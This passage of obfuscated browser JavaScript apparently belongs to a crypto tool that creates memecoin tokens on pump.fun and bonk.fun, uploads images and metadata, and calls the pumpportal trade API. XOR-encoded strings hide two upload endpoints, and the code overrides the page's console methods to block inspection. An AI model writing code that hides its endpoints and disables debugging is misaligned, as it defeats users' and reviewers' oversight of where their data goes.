            return decodeURIComponent(n);
          };
          (NO.rLQyxw = i), (t = arguments), (NO.HHpsXO = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.qCMOyP = t),
              (this.AMbhvD = [1, 0, 0]),
              (this.koDaGL = function () {
                return "newState";
              }),
              (this.FqwzPM = "\\w+ *\\(\\) *{\\w+ *"),
              (this.bnBXiN = "['|\"].+['|\"];? *}");
          };
          (e.prototype.GRaLJm = function () {
            const t = new RegExp(this.FqwzPM + this.bnBXiN).test(
              this.koDaGL.toString()
            )
              ? --this.AMbhvD[1]
              : --this.AMbhvD[0];
            return this.evKKsz(t);
          }),
            (e.prototype.evKKsz = function (t) {
              return Boolean(~t) ? this.tFKgmm(this.qCMOyP) : t;
            }),
            (e.prototype.tFKgmm = function (t) {
              for (let e = 0, n = this.AMbhvD.length; e < n; e++)
                this.AMbhvD.push(Math.round(Math.random())),
                  (n = this.AMbhvD.length);
              return t(this.AMbhvD[0]);
            }),
            new e(NO).GRaLJm(),
            (o = NO.rLQyxw(o)),
            (t[s] = o);
        }
        return o;
      }),
      NO(t, e)
    );
  }
  function DO() {
    const t = [
      "vw5RBM93BIbLCG",
      "mJKZodCYofr3zxz6qq",
      "C3rYAw5N",
      "y3jLyxrL",
      "BgvUz3rO",
      "u3bNCey",
      "Aw5PDgLHBeXPCq",
      "BMfTzq",
      "C2vHCMnO",
      "C2vSBcb0B2TLBG",
      "yxbWBhK",
      "yvnpvLm",
      "BI9QC29U",
      "BxnN",
      "q3jLyxrLzcb0BW",
      "z2v0vMfUAxr5",
      "C3z2ug0",
      "C2vSBa",
      "Dhj1zq",
      "nJq1mZqWnxn0BgXgBa",
      "CM9Y",
      "Aw5MBW",
      "yvvlrMK",
      "uKXHtxi",
      "shLwvwO",
      "C2LNBMf0DxjL",
      "E30Uy29UC3rYDq",
      "mJe4mty2mfHzENHkDG",
      "Bg9N",
      "C3vJy2vZCW",
      "wNPzDhK",
      "C2XPChbHz2u",
      "yxbWBgLJyxrPBW",
      "DwLKAxr5",
      "zgu/yxbPlwTLEq",
      "B2jQzwn0",
      "BxbWB3j0ywWUzG",
      "wfrqvei",
      "Dg9cyxnLntG",
      "zw5JB2rL",
      "mZa1odm5CwTfAvrR",
      "Dg9tDhjPBMC",
      "mJrNC3ncuMO",
      "zxjYB3i",
      "q29UDgvUDc1uEq",
      "z2v0u2v0DgLUzW",
      "C1DqvNe",
      "u29Szca",
      "whPRrvy",
      "jsbVzIb0B2TLBG",
      "z2v0sw5ZDgfUyW",
      "D2nOuMG",
      "zgvJB2rL",
      "mJy1otKYmeTgre5twq",
      "yxbPs2v5",
      "txD0r0G",
      "C3rYAw5NAwz5",
      "C3rHDhvZvgv4Da",
      "CuPZuxy",
      "nfHXvLr3uq",
      "DgLJA2vY",
      "tgTNwg8",
      "zw50AwnHDgvK",
      "BxDkC20",
      "A1rrEfy",
      "z2v0s2v5ugfPCG",
      "qLnMEge",
      "mJbRAgjoruC",
      "mJe2mtK0m0foAK9fvG",
      "mZi2nJeWugXsEwz5",
      "BuzHAM4",
      "r0PRzM8",
      "C2vJCMv0s2v5",
      "rejNufy",
      "y29UC29Szq",
      "BwvZC2fNzq",
      "yMLUza",
      "y1nJBgG",
      "zuXrq2y",
      "CM4GDgHPCYiPka",
      "ChjPB3jPDhLgzq",
    ];
    return (DO = function () {
      return t;
    })();
  }
  LO(void 0, function () {
    const t = 293,
      e = 328,
      n = 324,
      r = 304,
      o = 295,
      i = 260,
      s = 260,
      a = 322,
      u = 298,
      c = NO,
      l = {
        aUKFi: function (t, e) {
          return t(e);
        },
        ZJjJx: function (t, e) {
          return t + e;
        },
        bLqWP: "warn",
        sJPkT: c(321),
        HyVUj: function (t, e) {
          return t < e;
        },
      },
      d = (function () {
        const t = c;
        let e;
        try {
          e = l[t(a)](
            Function,
            l.ZJjJx(
              "return (function() " + t(326) + 'ctor("retu' + t(u) + " )",
              ");"
            )
          )();
        } catch (n) {
          e = window;
        }
        return e;
      })(),
      f = (d.console = d[c(t)] || {}),
      h = [c(e), l.bLqWP, l.sJPkT, "error", "exception", "table", "trace"];
    for (let p = 0; l[c(n)](p, h[c(r)]); p++) {
      const t = LO.constructor.prototype[c(o)](LO),
        e = h[p],
        n = f[e] || t;
      (t.__proto__ = LO.bind(LO)), (t[c(i)] = n[c(s)].bind(n)), (f[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const UO = async (t) => {
      const e = 314,
        n = 302,
        r = 269,
        o = 307,
        i = 279,
        s = 258,
        a = 291,
        u = 252,
        c = 331,
        l = 299,
        d = 255,
        f = 273,
        h = 316,
        p = 313,
        m = 267,
        g = 329,
        y = 276,
        w = 296,
        b = 294,
        v = 283,
        A = NO,
        k = {
          aSOVS: function (t, e) {
            return t & e;
          },
          DBgPV: function (t, e) {
            return t ^ e;
          },
          sWPVq: "pump",
          aKGrP: function (t, e, n) {
            return t(e, n);
          },
          svvPm: "applicatio" + A(312),
          XzkEV: A(e) + "ken successfully",
          jEjjB: "Unknown er" + A(320),
          cSclh: function (t, e) {
            return t instanceof e;
          },
          TqIFw: A(n),
          ZGsCS: "object",
        };
      try {
        if (!Yg.getInstance().isUserAuthenticated())
          return {
            msg: (function () {
              const t = 270,
                e = A,
                n = {
                  wchRh: function (t, e) {
                    return t & e;
                  },
                };
              n[e(v)] = function (t, e) {
                return t ^ e;
              };
              const r = n;
              let o;
              return function () {
                const n = e;
                if (!o) {
                  const e = new Uint8Array([
                      140, 215, 203, 205, 249, 205, 221, 159, 183, 203, 218,
                      159, 184, 209, 218, 215, 188, 202, 218, 214, 186, 197,
                      218, 218, 189,
                    ]),
                    i = -1079073575,
                    s = new Uint8Array(e.length);
                  for (let o = 0; o < e.length; o++) {
                    const a = r[n(t)](i >>> ((o % 4) * 8), 255);
                    s[o] = r.kTQxV(e[o], a);
                  }
                  o = new TextDecoder().decode(s);
                }
                return o;
              };
            })()(),
            success: ![],
          };
        const e = Qg.getInstance()[A(264) + "s"]();
        let n = $g[A(r) + "e"]().generateKeyPair();
        const w = await YO(t);
        if (!w)
          return {
            msg: (function () {
              const t = 304,
                e = 304,
                n = 292;
              let r;
              return function () {
                const o = NO;
                if (!r) {
                  const i = new Uint8Array([
                      157, 197, 199, 211, 190, 192, 142, 203, 180, 132, 222,
                      205, 190, 212, 207, 205, 190, 132, 218, 208, 176, 193,
                      192, 159, 191, 197, 218, 222,
                    ]),
                    s = -1079073573,
                    a = new Uint8Array(i[o(t)]);
                  for (let t = 0; t < i[o(e)]; t++) {
                    const e = k[o(311)](s >>> ((t % 4) * 8), 255);
                    a[t] = k[o(n)](i[t], e);
                  }
                  r = new TextDecoder().decode(a);
                }
                return r;
              };
            })()(),
            success: ![],
          };
        const b = {};
        (b.name = w[A(o)]), (b.symbol = w[A(i)]), (b.uri = w.uri);
        const I = {
            action: A(303),
            tokenMetadata: b,
            mint: Hm[A(s)](n[A(a)]),
            denominatedInSol: "true",
            amount: t["initialLiq" + A(u)],
            slippage: (null == e ? void 0 : e[A(c)]) || 10,
            priorityFee: (null == e ? void 0 : e[A(l) + "e"]) || 5e-4,
            pool: k[A(265)],
          },
          S = await k.aKGrP(
            fetch,
            "https://pu" +
              A(d) +
              "un/api/trade?api-key=" +
              (null == e ? void 0 : e[A(f)]),
            {
              method: "POST",
              headers: { "Content-Type": k[A(h)] },
              body: JSON.stringify(I),
            }
          );
        if (200 === S.status) {
          await S.json();
          const t = {};
          return (t[A(p)] = k[A(m)]), (t[A(g)] = !![]), t;
        }
        const _ = {};
        return (_.msg = S[A(y)]), (_[A(g)] = ![]), _;
      } catch (I) {
        let t = k.jEjjB;
        k[A(w)](I, Error)
          ? (t = I[A(b)])
          : typeof I === k.TqIFw
          ? (t = I)
          : I && typeof I === k.ZGsCS && (t = JSON.stringify(I));
        const e = {};
        return (e[A(313)] = "" + t), (e.success = ![]), e;
      }
    },
    qO = async (t) => {
      const e = 251,
        n = 281,
        r = 269,
        o = 315,
        i = 279,
        s = 258,
        a = 318,
        u = 306,
        c = 299,
        l = 313,
        d = 276,
        f = 289,
        h = 275,
        p = 329,
        m = 285,
        g = NO,
        y = {};
      (y[g(256)] = function (t, e) {
        return t & e;
      }),
        (y.BSfxa = function (t, e) {
          return t % e;
        }),
        (y.CHPUo = "POST"),
        (y.SjsAV = g(e) + "n/json"),
        (y[g(280)] = g(300) + g(320)),
        (y.TIFwi = function (t, e) {
          return t instanceof e;
        }),
        (y.mFajn = "object");
      const w = y;
      try {
        if (!Yg.getInstance()["isUserAuth" + g(n)]())
          return {
            msg: (function () {
              const t = 304,
                e = 305,
                n = {
                  RqxJb: function (t, e) {
                    return t < e;
                  },
                  qJsQv: function (t, e) {
                    return t & e;
                  },
                  SpgpF: function (t, e) {
                    return t * e;
                  },
                },
                r = n;
              let o;
              return function () {
                const n = NO;
                if (!o) {
                  const i = new Uint8Array([
                      140, 215, 203, 205, 249, 205, 221, 159, 183, 203, 218,
                      159, 184, 209, 218, 215, 188, 202, 218, 214, 186, 197,
                      218, 218, 189,
                    ]),
                    s = -1079073575,
                    a = new Uint8Array(i.length);
                  for (let o = 0; r.RqxJb(o, i[n(t)]); o++) {
                    const t = r[n(277)](s >>> r[n(e)](o % 4, 8), 255);
                    a[o] = i[o] ^ t;
                  }
                  o = new TextDecoder()[n(271)](a);
                }
                return o;
              };
            })()(),
            success: ![],
          };
        const e = await $O(t);
        if (!e)
          return {
            msg: (function () {
              let t;
              return function () {
                const e = NO;
                if (!t) {
                  const n = new Uint8Array([
                      153, 197, 199, 211, 186, 192, 142, 203, 176, 132, 222,
                      205, 186, 212, 207, 205, 186, 132, 218, 208, 180, 193,
                      192, 159, 187, 197, 218, 222,
                    ]),
                    r = -1079073569,
                    o = new Uint8Array(n.length);
                  for (let t = 0; t < n.length; t++) {
                    const i = w.XTPTB(r >>> (8 * w[e(m)](t, 4)), 255);
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            success: ![],
          };
        const f = $g[g(r) + "e"]();
        await f[g(o)]("bonk");
        let h = f.getKeyPair();
        const p = Qg[g(269) + "e"]().getSettings(),
          y = {};
        (y.name = e.name), (y.symbol = e[g(i)]), (y.uri = e.uri);
        const b = await fetch(
          "https://pumpportal.fun/api/trade?api-key=" +
            (null == p ? void 0 : p.apiKey),
          {
            method: w.CHPUo,
            headers: { "Content-Type": w.SjsAV },
            body: JSON.stringify({
              action: "create",
              tokenMetadata: y,
              mint: Hm[g(s)](h.secretKey),
              denominatedInSol: g(a),
              amount: t[g(u) + "uidity"],
              slippage: (null == p ? void 0 : p[g(331)]) || 10,
              priorityFee: (null == p ? void 0 : p[g(c) + "e"]) || 5e-4,
              pool: "bonk",
            }),
          }
        );
        if (200 === b.status) {
          await b.json();
          const t = {};
          return (
            (t[g(l)] = "Created token successfully"), (t.success = !![]), t
          );
        }
        const v = {};
        return (v.msg = b[g(d)]), (v.success = ![]), v;
      } catch (b) {
        let t = w.LkgXo;
        w.TIFwi(b, Error)
          ? (t = b[g(294)])
          : "string" == typeof b
          ? (t = b)
          : b && typeof b === w[g(f)] && (t = JSON[g(h)](b));
        const e = {};
        return (e.msg = "" + t), (e[g(p)] = ![]), e;
      }
    };
  axiomVamp;
  const zO = rR;
  (function (t) {
    const e = 486,
      n = 580,
      r = 510,
      o = 590,
      i = 535,
      s = 603,
      a = 598,
      u = 495,
      c = 610,
      l = rR,
      d = t();
    for (; []; )
      try {
        if (
          271694 ===
          (parseInt(l(e)) / 1) * (parseInt(l(n)) / 2) +
            (parseInt(l(523)) / 3) * (-parseInt(l(r)) / 4) +
            -parseInt(l(549)) / 5 +
            (-parseInt(l(o)) / 6) * (parseInt(l(584)) / 7) +
            (-parseInt(l(539)) / 8) * (parseInt(l(i)) / 9) +
            (-parseInt(l(s)) / 10) * (-parseInt(l(a)) / 11) +
            (-parseInt(l(u)) / 12) * (-parseInt(l(c)) / 13)
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(QO),
    (window[zO(518)] = function (t) {
      return function () {
        return t;
      };
    });
  const KO = { hash: "", lastValidHeight: 0, expiry: 0 };
  let WO = KO;
  const FO = {};
  (FO[zO(545)] = 0.1),
    (FO.useWebWorker = !![]),
    (FO[zO(611) + zO(565)] = 0.8),
    (FO.maxIteration = 5),
    (FO[zO(507) + zO(602)] = 500);
  const jO = FO,
    GO = (t) => {
      const e = zO;
      return Math[e(593)]()[e([543][0])](36).substring(2, 10) + "." + t;
    },
    VO = async (t) => {
      const e = 588,
        n = 578,
        r = 612,
        o = 594,
        i = 542,
        s = 554,
        a = 553,
        u = 487,
        c = 537,
        l = 525,
        d = 515,
        f = 532,
        h = 604,
        p = zO,
        m = {
          pRaWk: function (t, e) {
            return t < e;
          },
        };
      (m[p(605)] = p(e) + "ror"),
        (m.HFhck = function (t, e) {
          return t instanceof e;
        }),
        (m.lZeqH = function (t, e) {
          return t === e;
        }),
        (m.kJCge = p(n)),
        (m[p(r)] = function (t, e) {
          return t + e;
        }),
        (m[p(o)] = "error");
      const g = m;
      try {
        const e = Date.now();
        if (g.pRaWk(e, WO.expiry) && 0 !== WO[p(i)].length) return WO;
        const n = {};
        n.commitment = p(s);
        const { blockhash: r, lastValidBlockHeight: o } = await t[
            p(a) + p(501)
          ](n),
          l = {};
        return (
          (l.hash = r),
          (l[p(u) + "eight"] = o),
          (l[p(c)] = e + 3e4),
          (WO = l),
          WO
        );
      } catch (y) {
        let t = g.fWvob;
        g.HFhck(y, Error)
          ? (t = y.message)
          : "string" == typeof y
          ? (t = y)
          : y && g.lZeqH(typeof y, g.kJCge) && (t = JSON[p(l)](y)),
          xg(g.uuadr(p(d) + p(f), t), g.dKAfm);
        const e = { hash: "" };
        return (e["lastValidH" + p(h)] = 0), (e.expiry = 0), e;
      }
    },
    HO = (function () {
      const t = 526,
        e = 513,
        n = 556,
        r = 529,
        o = 608,
        i = 606,
        s = 513,
        a = 543,
        u = 543,
        c = zO,
        l = {
          vJRKY: function (t, e) {
            return t(e);
          },
          FqIMg: function (t, e) {
            return t + e;
          },
          rVLZv: '{}.constructor("return this")( )',
          uqQkC: function (t) {
            return t();
          },
          tJnsh: c(488),
          SvckI: "error",
          dGQYp: "exception",
          ZfHFa: c(579),
          apQBm: "trace",
          buBHE: function (t, e) {
            return t ^ e;
          },
          Qrpze: function (t, e, n) {
            return t(e, n);
          },
        },
        d = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n.apply(e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        f = l[c(t)](d, this, function () {
          const t = 563,
            e = c,
            n = l.uqQkC(function () {
              const e = rR;
              let n;
              try {
                n = l[e(t)](
                  Function,
                  l.FqIMg("return (function() " + l.rVLZv, ");")
                )();
              } catch (r) {
                n = window;
              }
              return n;
            }),
            r = (n.console = n.console || {}),
            f = ["log", l.tJnsh, "info", l[e(o)], l.dGQYp, l[e(i)], l[e(550)]];
          for (let o = 0; o < f[e(s)]; o++) {
            const t = d[e(500) + "r"].prototype.bind(d),
              n = f[o],
              i = r[n] || t;
            (t.__proto__ = d[e(519)](d)),
              (t[e(a)] = i[e(u)].bind(i)),
              (r[n] = t);
          }
        });
      let h;
      return (
        f(),
        function () {
          const t = c;
          if (!h) {
            const o = new Uint8Array([
                173, 148, 221, 155, 182, 218, 134, 196, 183, 144, 202, 197, 168,
                143, 206, 159, 160, 131, 193, 197, 161, 133, 223, 196, 172, 144,
                207, 152, 232, 134, 200, 152, 177, 223, 221, 132, 174, 133, 199,
                214,
              ]),
              i = -341188411,
              s = new Uint8Array(o[t(e)]);
            for (let e = 0; e < o.length; e++) {
              const r = (i >>> ((e % 4) * 8)) & 255;
              s[e] = l[t(n)](o[e], r);
            }
            h = new TextDecoder()[t(r)](s);
          }
          return h;
        }
      );
    })()(),
    ZO = (function () {
      const t = 513,
        e = 543,
        n = 500,
        r = 597,
        o = "(((.+)+)+)+$",
        i = function (t, e) {
          return t < e;
        },
        s = function (t, e) {
          return t % e;
        },
        a = function (t, e, n) {
          return t(e, n);
        },
        u = function (t) {
          return t();
        },
        c = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n.apply(e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        l = a(c, this, function () {
          const t = rR;
          return l
            .toString()
            .search("(((.+)+)+)+$")
            [t(e)]()
            [t(n) + "r"](l)
            [t(r)](o);
        });
      let d;
      return (
        u(l),
        function () {
          const e = rR;
          if (!d) {
            const n = new Uint8Array([
                175, 148, 221, 155, 180, 218, 134, 196, 163, 129, 196, 133, 234,
                148, 218, 198, 164, 146, 200, 145, 190, 205, 192, 133, 169, 137,
                221, 197, 182, 149, 192, 136, 172, 142, 198, 143, 162, 205, 192,
                155, 161, 147, 135, 136, 168, 141, 134, 130, 183, 134, 218, 196,
              ]),
              r = -341188409,
              o = new Uint8Array(n[e(t)]);
            for (let t = 0; i(t, n.length); t++) {
              const e = (r >>> (8 * s(t, 4))) & 255;
              o[t] = n[t] ^ e;
            }
            d = new TextDecoder().decode(o);
          }
          return d;
        }
      );
    })()(),
    XO = async (t, e, n, r) => {
      const o = 548,
        i = 527,
        s = 595,
        a = 521,
        u = 577,
        c = 528,
        l = 599,
        d = 555,
        f = 576,
        h = 498,
        p = 614,
        m = 595,
        g = 525,
        y = zO,
        w = { rtvDI: "Body" };
      (w.RaYPM = y(585)),
        (w.RgKwm = y(o)),
        (w[y(i)] = "Unknown error"),
        (w.QmUCu = function (t, e) {
          return t instanceof e;
        }),
        (w[y(499)] = function (t, e) {
          return t === e;
        }),
        (w[y(s)] = y(578));
      const b = w,
        v = new FormData();
      v.append(b.rtvDI, t, e), v.append("Key", e), v.append("ContentType", n);
      try {
        const t = {};
        (t[y(a)] = "Keep-Alive"),
          (t[y(600) + "oding"] = y(u) + y(c)),
          (t[y(l)] = "timeout=30, max=100");
        const e = {};
        (e[y(d)] = b.RaYPM),
          (e.body = v),
          (e.redirect = b.RgKwm),
          (e[y(516)] = t);
        const n = e,
          o = await fetch(HO + r, n),
          i = await o[y(f)]();
        return JSON[y(h)](i).pin[y(564)];
      } catch (A) {
        return (
          b.PaYnA,
          b[y(p)](A, Error)
            ? A.message
            : b.EmBgp(typeof A, "string") ||
              (A && typeof A === b[y(m)] && JSON[y(g)](A)),
          ""
        );
      }
    },
    JO = async (t, e) => {
      const n = 496,
        r = 544,
        o = 503,
        i = 587,
        s = 513,
        a = 540,
        u = 547,
        c = 561,
        l = 511,
        d = 536,
        f = 557,
        h = 533,
        p = 546,
        m = 485,
        g = 497,
        y = 569,
        w = 615,
        b = 525,
        v = 613,
        A = 492,
        k = 560,
        I = 502,
        S = 505,
        _ = zO,
        T = {
          aoxvM: "jpg",
          EquMI: "png",
          SQKpH: _(558),
          rSpJN: function (t, e) {
            return t(e);
          },
          JJvjI: function (t, e) {
            return t(e);
          },
          vOgZA: function (t, e) {
            return t + e;
          },
          gtrTj: function (t, e) {
            return t + e;
          },
          YjfmZ: function (t, e) {
            return t(e);
          },
          AKcvJ: function (t, e) {
            return t(e);
          },
          pXcmc: function (t, e, n, r, o) {
            return t(e, n, r, o);
          },
          fcQIk: function (t, e) {
            return t === e;
          },
          NEIyO: function (t, e, n) {
            return t(e, n);
          },
          GSuiC: function (t, e) {
            return t + e;
          },
          AhgHW: function (t, e) {
            return t + e;
          },
          lQqzX: "Metadata u" + _(n) + _(r) + _(o),
          LGEFe: "pump",
          kTkEG: function (t, e) {
            return t + e;
          },
          lMKOF: "string",
        };
      try {
        const n = await T.rSpJN(tO, t[_(i) + "age"]),
          r = (await OO(n, jO)) ?? n,
          o = r.type || "image/png",
          A = (t) => {
            const e = _,
              n = {};
            (n["image/jpeg"] = T.aoxvM),
              (n["image/jpg"] = "jpg"),
              (n[e(k)] = T.EquMI),
              (n["image/gif"] = "gif"),
              (n["image/webp"] = T[e(I)]);
            return n[t] || e(S);
          },
          B = T.rSpJN(GO, A(o)),
          C = T.JJvjI(GO, _(581)),
          E = Yg.getInstance().getToken(),
          x = await XO(r, B, o, E);
        if (!x || 0 === x[_(s)])
          return (
            xg(
              T.vOgZA(
                T.gtrTj("Image upload failed, falling back to ", e),
                ".fun"
              ),
              _(489)
            ),
            e === _(a) ? await T.YjfmZ(YO, t) : await T[_(u)]($O, t)
          );
        const P = ZO + x,
          O = {};
        (O[_(c)] = t.coinName),
          (O.symbol = t.ticker),
          (O[_(l) + "n"] = null),
          (O[_(d)] = P),
          (O.showName = "true"),
          (O[_(f)] = _(h) + e + _(p));
        const R = O;
        t[_(524)] && (R[_(m)] = t.twitterUrl),
          t.websiteUrl && (R.website = t[_(g)]);
        const M = {};
        M[_(y)] = "applicatio" + _(w);
        const L = new Blob([JSON[_(b)](R)], M),
          N = await T.pXcmc(XO, L, C, "application/json", E);
        if (!N || T.fcQIk(N[_(s)], 0))
          return (
            T.NEIyO(xg, T[_(607)](T.AhgHW(T.lQqzX, e), ".fun"), "warning"),
            e === T.LGEFe ? await T.YjfmZ(YO, t) : await $O(t)
          );
        const D = T.kTkEG(ZO, N),
          U = {};
        (U[_(561)] = t[_(v)]), (U.ticker = t.ticker), (U[_(616)] = D);
        return U;
      } catch (B) {
        return (
          _(601),
          1,
          B instanceof Error
            ? B.message
            : typeof B === T[_(A)] ||
              (B && "object" == typeof B && JSON[_(b)](B)),
          null
        );
      }
    };
  async function YO(t) {
    const e = 596,
      n = 562,
      r = 567,
      o = 530,
      i = 592,
      s = 540,
      a = 581,
      u = 506,
      c = 616,
      l = 572,
      d = zO,
      f = {
        xrekO: function (t, e) {
          return t(e);
        },
        rKqSu: function (t, e) {
          return t ?? e;
        },
        xJiAv: "showName",
        GgeMX: "true",
        oyowS: d(573) + d(e) + "/ipfs",
        hEUYJ: function (t, e) {
          return t instanceof e;
        },
        rYVYU: function (t, e) {
          return t === e;
        },
      };
    try {
      const e = await f[d(552)](tO, t["selectedIm" + d(n)]),
        l = await OO(e, jO),
        h = f.rKqSu(l, e),
        p = new FormData();
      p[d(r)]("file", h),
        p[d(r)]("name", t.coinName),
        p.append(d(o), t.ticker),
        p.append("twitter", t.twitterUrl),
        p.append("twitter", t.websiteUrl),
        p.append(f.xJiAv, f[d(559)]);
      const m = { method: "POST" };
      m.body = p;
      const g = await fetch(f[d(i)], m);
      if (!g) return await JO(t, d(s));
      const y = await g[d(a)]();
      if (!y || !y[d(u) + "i"]) return await JO(t, "pump");
      const w = {};
      (w[d(561)] = t.coinName),
        (w.ticker = t.ticker),
        (w[d(c)] = y.metadataUri);
      return w;
    } catch (h) {
      return (
        d(588),
        1,
        f[d(l)](h, Error)
          ? h.message
          : f.rYVYU(typeof h, d(583)) ||
            (h && "object" == typeof h && JSON.stringify(h)),
        null
      );
    }
  }
  function QO() {
    const t = [
      "z3PPCcWGzgvMBa",
      "B2jQzwn0",
      "DgfIBgu",
      "mtjYqNP5tfe",
      "ANnVBG",
      "lNDVCMTLCNmUza",
      "C3rYAw5N",
      "n25grgfHta",
      "ue9tva",
      "zLfuuxu",
      "C2vSzwn0zwrjBq",
      "vw5RBM93BIbLCG",
      "D2vzqKS",
      "mJqZndyZmLn4s2TJyG",
      "D2Dzr3e",
      "B3LVD1m",
      "CMfUzg9T",
      "zeTbzM0",
      "twL3Eve",
      "BxaUzNvUl2fWAq",
      "C2vHCMnO",
      "mJiWmgHltLLRtW",
      "s2vLCc1bBgL2zq",
      "qwnJzxb0luvUyW",
      "CM9Y",
      "sgvPz2H0",
      "nZqYmhb4tLjdtG",
      "zwLNAhq",
      "zLD2B2i",
      "wMzirMe",
      "r1n1Aum",
      "u3zJA0K",
      "t1DpCfy",
      "nZqXodK3ueTmqwfr",
      "Aw5PDgLHBff1yq",
      "DxvHzhi",
      "y29PBK5HBwu",
      "uw1vq3u",
      "BI9QC29U",
      "DxjP",
      "uuT5r0W",
      "DhDPDhrLCG",
      "mZeYotHgAu16y3K",
      "BgfZDfzHBgLKsa",
      "D2fYBG",
      "D2fYBMLUzW",
      "yxbWBgLJyxrPBW",
      "z25kvu4",
      "Be1lt0y",
      "zMv0y2GGC2v0Da",
      "C3vJy2vZCW",
      "mJi4shLMChbQ",
      "CgXVywqGzMfPBa",
      "D2vIC2L0zvvYBa",
      "CgfYC2u",
      "rw1cz3a",
      "y29UC3rYDwn0BW",
      "Bg9JA2HHC2G",
      "u1flCeG",
      "zYbIywnRihrVia",
      "zxyVDxbSB2fKlW",
      "Cg5N",
      "Bwv0ywrHDgfvCG",
      "Bwf4v2LKDgHpCG",
      "Aw5NCW",
      "Dc1ZDg9YywDLlG",
      "mJm0nhz6tfLsEa",
      "zgvZy3jPChrPBW",
      "ALvuuwK",
      "BgvUz3rO",
      "AuTNuKi",
      "qMXVy2TOyxnOia",
      "AgvHzgvYCW",
      "Eg5AAeK",
      "C2TdCNLWDa",
      "yMLUza",
      "Aw1N",
      "q29UBMvJDgLVBG",
      "BxnN",
      "mtC3owHArNrNzG",
      "DhDPDhrLCLvYBa",
      "C3rYAw5NAwz5",
      "uxjWEMu",
      "ugfzBKe",
      "yxrLlcbICG",
      "zgvJB2rL",
      "C3LTyM9S",
      "z0r0sgC",
      "zxjYB3i6ia",
      "Ahr0Chm6lY8",
      "BwvZC2fNzq",
      "mJq4mJy1AwXbww9f",
      "Aw1Hz2u",
      "zxHWAxj5",
      "sLLStu4",
      "mta0rhnTsuDf",
      "ChvTCa",
      "wgDXA0i",
      "AgfZAa",
      "Dg9tDhjPBMC",
      "zwqSigzHBgXPBG",
      "Bwf4u2L6zu1c",
      "lMz1BG",
      "quTJDKO",
      "zM9SBg93",
      "mtG0nJuWsvzftwvT",
      "yxbrqM0",
      "t29WAwG",
      "EhjLA08",
      "z2v0tgf0zxn0qG",
      "y29UzMLYBwvK",
      "Bwv0Ag9K",
      "yNvcseu",
      "y3jLyxrLze9U",
      "D2vICa",
      "r2DLtvG",
      "Aw1Hz2uVCg5N",
      "BMfTzq",
      "ywDL",
      "DKPss1K",
      "y2LK",
      "BgL0Eq",
      "z2v0u2v0DgLUzW",
      "yxbWzw5K",
      "vw9dDeS",
      "DhLWzq",
      "s2Xure0",
      "D2vIC2L0zq",
      "AevvwuO",
      "Ahr0Chm6lY9WDq",
      "uNDMAuu",
      "Ahr0Chm6lY9UzG",
      "Dgv4Da",
    ];
    return (QO = function () {
      return t;
    })();
  }
  async function $O(t) {
    const e = 575,
      n = 504,
      r = 520,
      o = 585,
      i = 509,
      s = 582,
      a = 588,
      u = 587,
      c = 513,
      l = 570,
      d = 490,
      f = 617,
      h = 525,
      p = 551,
      m = zO,
      g = {
        ttuwo: function (t, e) {
          return t(e);
        },
        CaClM: m(536),
        XMrmF: m(e) + "t-storage.letsbonk22" + m(582) + m(n) + m(r),
        NHXIe: m(o),
        KlTDM: function (t, e, n) {
          return t(e, n);
        },
        jUTQi: "bonk",
        QKyGL: function (t, e, n) {
          return t(e, n);
        },
        DPwlo: "https://nf" + m(i) + "letsbonk22" + m(s) + "ev/upload/meta",
        Oopih: function (t, e) {
          return t === e;
        },
        VKOVq: m(a) + "ror",
        dqlpu: "string",
        oKQzC: function (t, e) {
          return t === e;
        },
        JAdue: "object",
      };
    try {
      const e = await g.ttuwo(tO, t[m(u) + m(562)]),
        n = await OO(e, jO),
        r = new FormData();
      r.append(g.CaClM, n);
      const o = await fetch(g.XMrmF, { method: g.NHXIe, body: r });
      let i = await o.text();
      if (!i || 0 === i[m(c)]) return await g[m(l)](JO, t, g[m(512)]);
      const s = {};
      s["Content-Type"] = m(d) + "n/json";
      const a = {};
      (a[m(557)] = "https://bonk.fun"),
        (a.image = i),
        (a.name = t.coinName),
        (a.symbol = t.ticker),
        (a.twitter = t.twitterUrl),
        (a[m(571)] = t.websiteUrl);
      const y = await g[m(f)](fetch, g.DPwlo, {
        method: "POST",
        headers: s,
        body: JSON[m(h)](a),
      });
      let w = await y[m(576)]();
      if (!w || g[m(p)](w.length, 0)) return await JO(t, "bonk");
      const b = {};
      (b.name = t.coinName), (b.ticker = t.ticker), (b.uri = w);
      return b;
    } catch (y) {
      return (
        g.VKOVq,
        y instanceof Error
          ? y.message
          : typeof y === g.dqlpu ||
            (y && g.oKQzC(typeof y, g.JAdue) && JSON.stringify(y)),
        null
      );
    }
  }
  const tR = (t, e = 2e5) => {
      const n = function (t, e) {
          return t(e);
        },
        r = (function (t, e) {
          return t(e);
        })(BigInt, 1e9),
        o = BigInt(e),
        i = Math.ceil(1e6 * t),
        s = (((BigInt(i) * r) / BigInt(1e6)) * n(BigInt, 1e6)) / o;
      return new Yn(s);
    },
    eR = async (t, e) => {
      const n = 609,
        r = 491,
        o = 534,
        i = 583,
        s = zO,
        a = {
          fQTQu: function (t, e) {
            return t === e;
          },
          LGJjB: function (t, e, n) {
            return t(e, n);
          },
          OWOpV: "success",
          gnJUN: "Unknown er" + s(601),
          Kiohe: function (t, e) {
            return t === e;
          },
          WHNBi: "object",
          GAwdU: "error",
        };
      try {
        if (a[s(586)](e, "pump")) {
          const { msg: e, success: r } = await By(t);
          a.LGJjB(xg, e, r ? a[s(n)] : "error");
        } else {
          const { msg: e, success: n } = await (async (t) => {
            var e;
            const n = 415,
              r = 428,
              o = 405,
              i = 401,
              s = 441,
              a = 379,
              u = 381,
              c = 425,
              l = 447,
              d = 394,
              f = 388,
              h = 417,
              p = 382,
              m = 434,
              g = 413,
              y = 365,
              w = 374,
              b = 435,
              v = 437,
              A = 411,
              k = 403,
              I = 427,
